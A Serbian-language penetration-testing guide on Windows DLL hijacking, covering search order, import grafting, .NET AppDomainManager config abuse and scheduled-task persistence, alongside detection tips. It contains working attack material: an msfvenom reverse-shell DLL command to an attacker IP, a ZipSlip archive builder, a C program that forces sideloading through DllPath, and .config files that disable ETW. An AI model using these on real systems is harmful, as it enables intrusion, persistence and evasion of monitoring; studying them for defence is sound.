# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Osnovne informacije

DLL Hijacking podrazumeva manipulisanje pouzdanom aplikacijom kako bi učitala zlonamerni DLL. Ovaj termin obuhvata nekoliko taktika, kao što su **DLL Spoofing, Injection i Side-Loading**. Uglavnom se koristi za izvršavanje koda i postizanje perzistencije, a ređe za eskalaciju privilegija. Iako je ovde fokus na eskalaciji, način otmice ostaje isti bez obzira na cilj.

### Uobičajene tehnike

Za DLL hijacking koristi se nekoliko metoda, a njihova efikasnost zavisi od strategije aplikacije za učitavanje DLL-ova:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Zamena legitimnog DLL-a zlonamernim, uz mogućnost korišćenja DLL Proxying-a kako bi se sačuvala funkcionalnost originalnog DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje zlonamernog DLL-a na putanju pretrage koja ima prednost u odnosu na legitimni DLL, čime se iskorišćava obrazac pretrage aplikacije.
3. **Phantom DLL Hijacking**: Kreiranje zlonamernog DLL-a koji aplikacija učitava misleći da je u pitanju nepostojeći, ali neophodan DLL.
4. **DLL Redirection**: Izmena parametara pretrage kao što je `%PATH%` ili datoteka `.exe.manifest` / `.exe.local` kako bi se aplikacija usmerila na zlonamerni DLL.
5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a zlonamernim u direktorijumu WinSxS; ovaj metod se često povezuje sa DLL side-loading-om.
6. **Relative Path DLL Hijacking**: Postavljanje zlonamernog DLL-a u direktorijum pod kontrolom korisnika, zajedno sa kopiranom aplikacijom, slično tehnikama Binary Proxy Execution.

Aplikacija može da implementira i **sopstveni DLL loader**. Proces sa privilegijama može da pretražuje podređeni direktorijum, kao što su `Libraries` ili `Plugins`, i prosledi odabrani DLL pomoćnom procesu, nezavisno od uobičajenog Windows redosleda pretrage DLL-ova. Ako drugi nalog može da kreira datoteke u tom konkretnom direktorijumu, tretirajte to kao trag za dalju proveru: utvrdite identitet procesa, efektivni ACL direktorijuma, pravilo za izbor datoteke i da li postoji putanja do učitavanja. To što je direktorijum pored izvršne datoteke moguće menjati ne dokazuje da proces iz njega učitava DLL-ove.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Post-installation PE import grafting

Klasični side-loading ostavlja pouzdani PE neizmenjenim i iskorišćava razrešavanje naziva DLL-a. **Import grafting** umesto toga menja PE koji je pouzdani program već učitao. Napadač dodaje deskriptor importa i povezane stavke lookup/IAT za DLL pod kontrolom napadača. Kada Windows rekurzivno razreši tu zavisnost, mapira dodatni DLL i pokreće njegov inicijalizacioni kod unutar inače legitimnog procesa. Ovo je izmena PE-a na disku, a ne ista operacija kao zamena pokazivača funkcije u aktivnom IAT-u runtime hook-om.<sup>[[31]](#references)[[32]](#references)</sup>

Izmenjeni PE može biti posredni DLL dobavljača, a ne izvršna datoteka koju pokreće korisnik ili Task Scheduler. Lanac koji se može ponovo koristiti izgleda ovako:<sup>[[32]](#references)</sup>

1. Kopirajte legitimnu izvršnu datoteku i njene zavisnosti u direktorijum pod kontrolom napadača.
2. Izmenite strukture importa jedne zavisnosti tako da upućuju na zlonamerni DLL, uz očuvanje očekivanih eksportovanih funkcija i uobičajenog ponašanja zavisnosti.
3. Podesite autorun ili zakazani zadatak da pokrene legitimnu izvršnu datoteku. Loader mapira izmenjenu zavisnost, a zatim i novouvezeni DLL. Pogledajte [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) za nabrajanje zadataka.
4. Ne obavljajte zahtevne operacije u `DllMain`; posmatrani loader je kreirao radnu nit i u njoj nastavio dešifrovanje pripremljenog sadržaja.

Ovo se razlikuje od kompromitovanja lanca snabdevanja na strani dobavljača ako je paket dobavljača čist, a import se menja nakon instalacije. Pregledajte svaki modul u pripremljenom direktorijumu, ne samo host EXE: uporedite liste importa i hash vrednosti zavisnosti sa poznatom ispravnom instalacijom, proverite potpise i istražite binarne datoteke dobavljača pokrenute sa neočekivanih lokacija u koje je moguće upisivati, kao što je `C:\ProgramData`. Zakazani zadatak koji upućuje na kopirani izveštavač o padu ili program za ažuriranje u takvom direktorijumu posebno je koristan trag za dalju istragu.<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klasično DLL sideloading nije jedini način da se pouzdanom procesu **.NET Framework** naloži učitavanje koda napadača. Ako je ciljna izvršna datoteka **managed** aplikacija, CLR takođe proverava konfiguracionu datoteku aplikacije nazvanu po izvršnoj datoteci (na primer `Setup.exe.config`). Ta datoteka može da definiše prilagođeni **AppDomainManager**. Ako konfiguracija upućuje na assembly pod kontrolom napadača, postavljen pored EXE-a, CLR ga učitava **pre uobičajene putanje izvršavanja aplikacije** i pokreće unutar pouzdanog procesa.<sup>[[24]](#references)</sup>

Prema Microsoft-ovoj šemi konfiguracije za .NET Framework, za korišćenje prilagođenog manager-a moraju biti navedeni i `<appDomainManagerAssembly>` i `<appDomainManagerType>`.<sup>[[16]](#references)[[17]](#references)</sup>

Minimalna konfiguracija:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimalni menadžer:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Praktične napomene:
- Ovo je tradecraft specifičan za **.NET Framework**. Oslanja se na parsiranje CLR konfiguracije, a ne na redosled pretrage Win32 DLL-ova.
- Host zaista mora biti **managed EXE**. Brza trijaža: `sigcheck -m target.exe`, `corflags target.exe` ili provera **CLR Runtime Header**-a u PE metapodacima.
- Ime konfiguracione datoteke mora se tačno poklapati s imenom izvršne datoteke (`<binary>.config`) i obično se nalazi **pored EXE-a**.
- Ovo je korisno uz **potpisane Microsoft-ove/datavljačeve binarne datoteke** zato što pouzdani EXE ostaje neizmenjen, dok se zlonamerni managed assembly izvršava unutar procesa.
- Ako već imate direktorijum instalacionog programa/ažuriranja u koji možete da upisujete, AppDomainManager hijacking može se koristiti kao **prva faza**, a zatim se u kasnijim fazama mogu koristiti klasični DLL sideloading ili reflektivno učitavanje.

### Potpisani tip AppDomainManager kao gadget konfiguracione datoteke

Uobičajeni AppDomainManager config hijack iznad upućuje na assembly napadača. Drugačiji .NET Framework pristup koristi **potpisani assembly**, postavljen uz host ili dostupan na drugi način, čiji tip manager-a čita prateće podatke pod kontrolom napadača. Napadač i dalje mora da kontroliše susednu datoteku `.exe.config` managed host-a i sekundarne datoteke; potpis izabranog assembly-ja ne čini njegov konfiguracioni ulaz bezbednim. Mehanizam konfiguracije je utvrđeno ponašanje AppDomainManager-a, dok je povezivanje potpisanog tipa opisano u nastavku uočeno tokom analize NetamLoader-a.<sup>[[16]](#references)[[17]](#references)[[35]](#references)</sup>

U tom lancu konfiguracija bira `Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration` iz `Microsoft.HostIntegration.Connectors`. Njegova inicijalizacija traži `fabric.config` u direktorijumu aplikacije. Unos `customType` navodi `System.Resources.ResXResourceSet` i prosleđuje `Resources.resx` kao argument konstruktora, čime se dolazi do parsera resursa bez isporučivanja DLL-a manager-a koji je izgradio napadač. Za ovo je potrebno da se na ciljnom sistemu mogu razrešiti potpisani assembly povezan s AppFabric-om i navedene klase framework-a; ovo nije univerzalno svojstvo svakog managed EXE-a.<sup>[[35]](#references)</sup> Konfigurisani AppDomainManager zahteva i full-trust aplikaciju; u suprotnom CLR izbacuje `TypeLoadException`.<sup>[[16]](#references)[[17]](#references)</sup>

```xml
<!-- in <host>.exe.config -->
<configuration>
  <runtime>
    <appDomainManagerType value="Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration" />
    <appDomainManagerAssembly value="Microsoft.HostIntegration.Connectors, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
  </runtime>
</configuration>
```

```xml
<!-- adjacent fabric.config -->
<section name="foo">
  <customType className="System.Resources.ResXResourceSet, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089(Resources.resx)" />
</section>
```

Sadržaj `Resources.resx` je odredište za deserializaciju, a ne samo datoteka sa podacima; pogledajte [RESX to BinaryFormatter and XAML](../../../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml). U prijavljenoj fazi, XAML loader je takođe izvodio AES ključ iz SHA-256 heša **kompletne komandne linije hosta pretvorene u mala slova** i koristio prvih 16 bajtova dekodiranog bloba kao IV. Zato ponovno pokretanje datoteka sa drugačijom komandnom linijom ne uspeva pri dešifrovanju, pre učitavanja sledećeg XAML-a.<sup>[[35]](#references)</sup>

### AppDomainManager kao downloader + početni mehanizam za scheduled task

Praktičan obrazac upada jeste kombinovanje pouzdanog upravljanog EXE-a sa zlonamernim `*.config` fajlom i zlonamernom AppDomainManager DLL datotekom koja služi samo kao **mali bootstrapper**:<sup>[[25]](#references)</sup>

1. Korisnik pokreće potpisani .NET installer ili updater sa uverljive lokacije, kao što je `%USERPROFILE%\Downloads`.
2. Pridruženi config navodi CLR da učita attacker assembly **pre nego što počne logika legitimne aplikacije**.
3. Zlonamerni manager sprovodi **path gate** (na primer, nastavlja samo ako se host EXE pokreće iz fascikle `Downloads`, a drugoj fazi dozvoljava pokretanje samo iz `%LOCALAPPDATA%`).
4. Ako provera prođe, preuzima pravi payload u putanju u koju korisnik može da upisuje, kao što je `%LOCALAPPDATA%\PerfWatson2.exe`, i uspostavlja persistence pomoću scheduled task-a.

Zašto je ova varijanta važna:
- Potpisani host EXE ostaje neizmenjen, pa trijaža koja proverava samo heš glavnog binarnog fajla može da ne otkrije kompromitaciju.
- Jednostavan **path-based anti-analysis** je čest: premeštanje ZIP/EXE/DLL trojke na Desktop, u Temp ili na putanju sandbox-a može namerno da prekine lanac.
- AppDomainManager DLL prve faze može da ostane mali i neupadljiv, dok se pravi implant preuzima kasnije.

Minimalni primer persistence-a koji se često viđa uz ovaj obrazac:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Napomene:
- ` /rl highest` znači **najviši dostupan nivo** za tog korisnika/sesiju; sam po sebi ne garantuje eskalaciju do SYSTEM-a.
- Ovu tehniku je često bolje kategorizovati kao **izvršavanje/persistence putem zloupotrebe .NET konfiguracije** nego kao klasični hijacking redosleda pretrage za nedostajući DLL, iako operateri često kombinuju obe tehnike.

Pivoti za detekciju:
- Potpisani .NET izvršni fajlovi pokrenuti iz **putanja za raspakivanje ZIP arhiva**, fascikle `Downloads`, `%TEMP%` ili drugih fascikli u koje korisnik može da upisuje, uz **pripadajući** `<exe>.config`.
- Novi zakazani zadaci čija radnja pokazuje na `%LOCALAPPDATA%`, `%APPDATA%` ili `Downloads`, a čiji nazivi podsećaju na programe za ažuriranje pregledača ili proizvođača softvera.
- Kratkotrajni upravljani bootstrap procesi koji odmah preuzimaju drugi EXE, a zatim pokreću `schtasks.exe`.
- Primerci koji se rano zatvaraju ako putanja do izvršnog fajla ne odgovara očekivanoj fascikli korisničkog profila.

### Hijacking postojećeg zakazanog zadatka radi ponovnog pokretanja sideload lanca

Radi persistence-a, nemojte tražiti samo **kreiranje novog zadatka**. Neke grupe koje sprovode upade čekaju da legitimni instalacioni program kreira **uobičajeni zadatak za ažuriranje**, a zatim **prepravljaju radnju zadatka** tako da postojeći naziv, autor i okidač ostanu poznati braniocima.

Ponovljiv postupak:
1. Instalirajte/pokrenite legitimni softver i identifikujte zadatak koji on obično kreira.
2. Izvezite XML zadatka i zabeležite trenutne vrednosti `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Zamenite samo radnju tako da zadatak pokreće vaš **pouzdani host EXE** iz privremene fascikle u koju korisnik može da upisuje; on zatim učitava stvarni payload putem side-loading-a ili AppDomain-load-a.
4. Ponovo registrujte isti naziv zadatka umesto da kreirate novi, očigledan artefakt persistence-a.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Zašto je neprimetnije:
- Naziv zadatka i dalje može da deluje legitimno (na primer, kao vendor updater).
- Pokreće ga **Task Scheduler service**, pa provera roditeljskog procesa/pretka često vidi očekivani lanac pokretanja kroz raspoređivač, a ne `explorer.exe`.
- DFIR timovi koji traže samo **nove nazive zadataka** mogu da previde zadatak čija je registracija već postojala, ali čija akcija sada upućuje na `%LOCALAPPDATA%`, `%APPDATA%` ili neku drugu putanju koju kontroliše napadač.

Brze mogućnosti za pretragu:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Uporedite XML datoteke u `C:\Windows\System32\Tasks\*` i metapodatke u `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` sa osnovnim stanjem.
- Generišite upozorenje kada **zadatak za updater koji izgleda kao da pripada vendoru** pokreće izvršnu datoteku iz **direktorijuma u koje korisnik može da upisuje** ili pokreće .NET EXE sa pratećom datotekom `*.config`.

> [!TIP]
> Za lanac koraka koji kombinuje HTML staging, AES-CTR konfiguracije i .NET implantate sa DLL sideloadingom pogledajte sledeći tok rada.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### Vezivanje sideloaded faze za komandnu liniju servisa

Sideloaded DLL može zahtevati više od očekivanog naziva host EXE i DLL. Mandiant je opisao loader koji veže dešифровање payload-а за аргумент командне линије и назив извршне датотеке host процеса.<sup>[[33]](#references)</sup> У каснијем ланцу који покреће сервис, копирани легитимни host учитао је суседну датотеку `mscoree.dll`, која је извозила `LockClrVersion` и дешифровала уграђену фазу тек након извођења AES-128 кључа из аргумента сервиса и основног назива извршне датотеке host процеса. Сваки улаз је скраћен или допуњен NUL бајтовима до 16 бајтова; кључ по бајтовима био је `argument XOR embedded_key XOR executable_basename`, а затим је payload дешифрован помоћу AES-CBC без допуњавања. Преименовање host-а или покретање без очекиваног аргумента мења кључ и спречава дешифровање ове фазе, чак и ако се DLL и даље учита. Када поново изводите или анализирате ову варијанту, сачувајте тачан аргумент командне линије и основни назив датотеке.<sup>[[34]](#references)</sup>

Ово је **ограничење payload-а додато уобичајеном DLL side-loading-у**, а не ново правило редоследа претраге DLL-ова нити самосталан механизам за ескалацију привилегија. Ниво привилегија који се добија одређује безбедносни контекст сервиса. [GitHub issue/file C2 workflow](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md) засебно описује каснији транспорт.<sup>[[34]](#references)</sup>

## Проналажење недостајућих DLL-ова

Најчешћи начин да пронађете недостајуће DLL-ове у систему јесте да покренете [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) из пакета sysinternals и **подесите** **следећа 2 филтера**:

![Уобичајене технике - Проналажење недостајућих DLL-ова: Најчешћи начин да пронађете недостајуће DLL-ове у систему јесте да покренете procmon из пакета sysinternals и подесите следећа 2 филтера](<../../../images/image (961).png>)

![Уобичајене технике - Проналажење недостајућих DLL-ова: Најчешћи начин да пронађете недостајуће DLL-ове у систему јесте да покренете procmon из пакета sysinternals и подесите следећа 2 филтера](<../../../images/image (230).png>)

и прикажете само **File System Activity**:

![Уобичајене технике - Проналажење недостајућих DLL-ова: и прикажете само File System Activity](<../../../images/image (153).png>)

Ако тражите **недостајуће DLL-ове уопште**, оставите ово да ради неколико **секунди**.\
Ако тражите **недостајући DLL у одређеној извршној датотеци**, подесите још један филтер, на пример **"Process Name" "contains" `<exec name>`**, покрените је и зауставите прикупљање догађаја.<sup>[[9]](#references)</sup>

## Искоришћавање недостајућих DLL-ова

Да бисте ескалирали привилегије, потражите **DLL који привилеговани процес покушава да учита** са локације у коју можете да уписујете. То се може десити када контролишете директоријум који се претражује пре директоријума са легитимним DLL-ом или када тражени DLL не постоји, а можете да уписујете у један од претраживаних директоријума.

### Редослед претраге DLL-ова

**Унутар** [**Microsoft документације**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **можете пронаћи објашњење о томе како се DLL-ови учитавају.**

**Windows апликације** траже DLL-ове пратећи скуп **унапред дефинисаних путања за претрагу**, утврђеним редоследом. До DLL hijacking-а долази када се злонамерни DLL стратешки постави у један од ових директоријума како би се учитао пре оригиналног DLL-а. Да би се ово спречило, апликација треба да користи апсолутне путање када наводи DLL-ове који су јој потребни.

У наставку је приказан **редослед претраге DLL-ова на 32-битним** системима:

1. Директоријум из којег је апликација учитана.
2. Системски директоријум. Користите функцију [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) да бисте сазнали путању до овог директоријума.(_C:\Windows\System32_)
3. 16-битни системски директоријум. Не постоји функција која враћа путању до овог директоријума, али се он претражује. (_C:\Windows\System_)
4. Windows директоријум. Користите функцију [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) да бисте сазнали путању до овог директоријума.
   1. (_C:\Windows_)
5. Тренутни директоријум.
6. Директоријуми наведени у променљивој окружења PATH. Имајте на уму да ово не обухвата путању за одређену апликацију наведену у кључу регистратора **App Paths**. Кључ **App Paths** се не користи при израчунавању путање за претрагу DLL-ова.

То је **подразумевани** редослед претраге када је омогућен **SafeDllSearchMode**. Када је онемогућен, тренутни директоријум се помера на друго место. Да бисте онемогућили ову функцију, направите вредност регистратора **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** и поставите је на 0 (подразумевано је омогућена).

Ако се функција [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) позове са **LOAD_WITH_ALTERED_SEARCH_PATH**, претрага почиње у директоријуму извршног модула који **LoadLibraryEx** учитава.

На крају, DLL може да се учитава помоћу апсолутне путање уместо назива. У том случају Windows тражи сам DLL само на тој путањи; зависности наведене по називу и даље прате одговарајући редослед претраге.

Постоје и други начини за измену редоследа претраге, али их овде нећу објашњавати.

### Повезивање произвољног уписивања датотеке са hijack-ом због недостајућег DLL-а

**Повезана техника:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Користите филтере у **ProcMon**-у (`Process Name` = циљни EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) да бисте прикупили називе DLL-ова које процес тражи, али не може да пронађе.<sup>[[14]](#references)</sup>
2. Ако се бинарна датотека покреће **по распореду/као сервис**, постављање DLL-а са једним од тих назива у **директоријум апликације** (ставка бр. 1 у редоследу претраге) довешће до његовог учитавања при следећем покретању. У једном случају са .NET скенером, процес је тражио `hostfxr.dll` у `C:\samples\app\` пре него што је учитао праву копију из `C:\Program Files\dotnet\fxr\...`.
3. Направите payload DLL (нпр. reverse shell) са било којим export-ом: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Ако је ваш примитив **произвољно уписивање у стилу ZipSlip-а**, направите ZIP чија ставка излази из директоријума за распакивање, тако да DLL заврши у директоријуму апликације:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Dostavite arhivu u nadgledani inbox/share; kada zakazani zadatak ponovo pokrene proces, on učitava zlonamerni DLL i izvršava vaš kod kao servisni nalog.

### Prinudno sideloading učitavanje pomoću RTL_USER_PROCESS_PARAMETERS.DllPath

Napredni način da deterministički utičete na putanju pretrage DLL-a novokreiranog procesa jeste da podesite polje DllPath u RTL_USER_PROCESS_PARAMETERS prilikom kreiranja procesa pomoću nativnih API-ja iz ntdll-a. Ako ovde navedete direktorijum pod kontrolom napadača, ciljni proces koji razrešava naziv uvezenog DLL-a (bez apsolutne putanje i bez korišćenja oznaka za bezbedno učitavanje) može biti primoran da učita zlonamerni DLL iz tog direktorijuma.

Ključna ideja
- Napravite parametre procesa pomoću RtlCreateProcessParametersEx i navedite prilagođeni DllPath koji pokazuje na fasciklu koju kontrolišete (npr. direktorijum u kojem se nalazi vaš dropper/unpacker).
- Kreirajte proces pomoću RtlCreateUserProcess. Kada ciljna binarna datoteka razrešava naziv DLL-a, učitavač će tokom razrešavanja proveriti navedeni DllPath, što omogućava pouzdano sideloading učitavanje čak i kada se zlonamerni DLL ne nalazi u istom direktorijumu kao ciljni EXE.

Napomene/ograničenja
- Ovo utiče na kreirani podređeni proces; razlikuje se od SetDllDirectory, koji utiče samo na tekući proces.
- Ciljni proces mora da uvozi DLL po nazivu ili da poziva LoadLibrary za DLL po nazivu (bez apsolutne putanje i bez korišćenja LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardkodirane apsolutne putanje ne mogu se oteti. Prosleđeni export-i i SxS mogu promeniti redosled prioriteta.

Minimalni primer u C-u (ntdll, široki stringovi, pojednostavljeno rukovanje greškama):

<details>
<summary>Pun primer u C-u: prinudno sideloading učitavanje DLL-a pomoću RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Primer operativne upotrebe
- Postavite zlonamerni xmllite.dll (koji izvozi potrebne funkcije ili prosleđuje pozive pravoj biblioteci) u direktorijum DllPath.
- Pokrenite potpisani binarni fajl za koji je poznato da pomoću gorenavedene tehnike traži xmllite.dll po imenu. Loader razrešava import preko zadatog DllPath-a i sideloaduje vašu DLL biblioteku.

Ova tehnika je primećena u stvarnim napadima kao način za pokretanje višefaznih sideloading lanaca: početni launcher ispušta pomoćnu DLL biblioteku, koja zatim pokreće Microsoft-ovim potpisom označen binarni fajl podložan hijacking-u, sa prilagođenim DllPath-om koji primorava učitavanje DLL biblioteke napadača iz staging direktorijuma.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking pomoću `.exe.config`

Za **.NET Framework** mete, sideloading se može obaviti **pre `Main()`** bez menjanja memorije, zloupotrebom susedne datoteke **`.exe.config`** aplikacije. Umesto oslanjanja isključivo na Win32 redosled pretrage DLL biblioteka, napadač postavlja legitimnu .NET EXE datoteku pored zlonamerne konfiguracione datoteke i jednog ili više assembly-ja pod kontrolom napadača.

Kako lanac funkcioniše:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE se pokreće, a **CLR čita `<exe>.config`**.
2. Konfiguracija postavlja **`<appDomainManagerAssembly>`** i **`<appDomainManagerType>`** tako da runtime instancira `AppDomainManager` pod kontrolom napadača.
3. Zlonamerni manager dobija mogućnost izvršavanja **pre `Main()`** unutar procesa pouzdanog hosta.
4. Ista konfiguracija može da primora CLR da prvo razrešava lokalne assembly-je (na primer `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) i da oslabi runtime validaciju/telemetriju bez inline patching-a.

Obrazac u stilu kampanje (tačno ugnježđivanje može da se razlikuje u zavisnosti od direktive / verzije CLR-a):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Zašto je ovo korisno:
- **`<probing privatePath="."/>`** zadržava razrešavanje assembly-ja u direktorijumu aplikacije i pretvara tu fasciklu u predvidljivu površinu za sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** preusmeravaju izvršavanje na kod napadača tokom inicijalizacije CLR-a, pre pokretanja legitimne logike aplikacije.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** može omogućiti aplikaciji sa punim nivoom poverenja da učita nepotpisane ili izmenjene assembly-je bez greške pri validaciji strong name-a.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** sprečava preusmeravanja publisher policy-ja na novije assembly-je.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** čini izbor runtime-a predvidljivijim.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** posebno je zanimljivo jer **CLR onemogućava sopstvenu ETW vidljivost** iz konfiguracije, umesto da implant zakrpi `EtwEventWrite` u memoriji.

Operativni obrazac uočen u nedavnim kampanjama:
- Faza 1 izbacuje `setup.exe`, `setup.exe.config` i lokalne assembly-je.
- Faza 2 ih kopira u uverljivu fasciklu za **AppData update**, preimenuje host u nešto poput `update.exe` i ponovo ga pokreće pomoću **scheduled task-a**.
- Faza 3 proverava kontekst izvršavanja (na primer, da li je očekivani roditelj `svchost.exe` pokrenut iz Task Scheduler-a) pre učitavanja konačnog RAT DLL-a/export-a.

Ideje za traženje:
- Potpisani ili na drugi način legitimni **.NET izvršni fajlovi** koji se pokreću uz sumnjive prateće fajlove **`.config`** na lokacijama u koje korisnik može da upisuje.
- Fajlovi `.config` koji sadrže **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** ili **`etwEnable enabled="false"`**.
- Scheduled tasks koji ponovo pokreću preimenovane update binarne fajlove iz fascikli **`%LOCALAPPDATA%`** ili namenski određenih direktorijuma `\bin\update\`.
- Lanci roditeljskih/potomačkih procesa u kojima scheduled task pokreće pouzdani .NET host, koji odmah učitava assembly-je koji nisu od proizvođača iz sopstvenog direktorijuma.

#### Izuzeci od redosleda pretrage dll fajlova prema Windows dokumentaciji

U Windows dokumentaciji navedeni su određeni izuzeci od standardnog redosleda pretrage DLL-a:

- Kada se naiđe na **DLL sa istim imenom kao DLL koji je već učitan u memoriju**, sistem zaobilazi uobičajenu pretragu. Umesto toga, proverava da li postoji preusmeravanje i manifest, pa zatim podrazumevano koristi DLL koji je već u memoriji. **U ovom slučaju sistem ne pretražuje DLL**.
